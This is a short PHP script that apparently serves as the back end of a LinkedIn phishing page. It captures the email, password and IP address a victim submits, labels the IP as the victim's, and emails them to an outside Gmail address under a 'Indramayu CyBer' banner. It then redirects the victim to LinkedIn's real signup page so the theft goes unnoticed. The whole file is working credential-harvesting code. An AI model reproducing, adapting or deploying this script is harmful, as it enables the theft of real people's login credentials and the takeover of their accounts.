<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['session_key'];
$password = $_POST['session_password'];


$login = "Email : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Linkedin Login | ".$ip;
mail("101manager231@gmail.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: https://www.linkedin.com/start/join?trk=guest_homepage-basic_nav-header-join");
?>